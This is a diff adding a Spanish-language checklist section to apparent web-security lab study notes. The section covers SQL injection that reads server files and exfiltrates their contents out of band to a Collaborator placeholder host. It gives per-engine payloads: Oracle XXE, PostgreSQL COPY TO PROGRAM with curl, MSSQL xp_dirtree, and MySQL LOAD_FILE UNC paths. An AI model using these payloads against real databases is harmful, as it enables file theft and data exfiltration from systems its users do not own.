@@ -36,6 +36,15 @@
 - [ ] **PostgreSQL**: `COPY (...) TO/FROM`, `pg_read_file('/home/carlos/secret')`.
 - [ ] **Stacked queries** → si el motor permite `;`, encadenar lectura/escritura.
 - [ ] Si no hay lectura de fichero → **UNION/blind** para sacar datos que abran otra vía.
+
+> [!tip] 💡 *(idea propia — caso de prueba)* SQLi → leer fichero **y exfiltrar por OAST**
+> El combo peligroso: si la salida **no vuelve en la respuesta** (blind / sin UNION visible), juntás **lectura de fichero + canal OOB a Collaborator** en una sola query y te llevás el contenido sin verlo. Ojo: **casi todos requieren privilegios altos** (FILE / superuser / `secure_file_priv`) y son **específicos por motor** → primero fingerprint del DBMS.
+- [ ] **Oracle** (es *XXE dentro de SQL* → [[vulnerabilities/006-xxe/xxe|XXE]]): `extractvalue(xmltype('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://'||(SELECT ...)||'.COLLAB/">%p;]>'),'/l')` → callback DNS/HTTP con los datos en el subdominio. Alt: `UTL_HTTP.request`.
+- [ ] **PostgreSQL**: `COPY (SELECT pg_read_file('/home/carlos/secret')) TO PROGRAM 'curl http://COLLAB/?x=...'` (superuser) — o exfil por `dblink` a tu host.
+- [ ] **MSSQL**: leer con `OPENROWSET(BULK '/home/carlos/secret', SINGLE_CLOB)` → exfiltrar por `xp_dirtree '\\<datos>.COLLAB\x'` (SMB → DNS).
+- [ ] **MySQL (Windows)**: `LOAD_FILE(CONCAT('\\\\',(SELECT HEX(LOAD_FILE('/home/carlos/secret'))),'.COLLAB\\x'))` → SMB/DNS. En Linux el OOB de MySQL es limitado.
+- [ ] Contenido grande → trocear con `SUBSTR` + hex y **reconstruir** desde los hits del Collaborator.
+
 - 📁 `vulnerabilities/sql-injection/` · ofuscación en `vulnerabilities/obfuscacion/`
 
 ### XML External Entity (XXE)
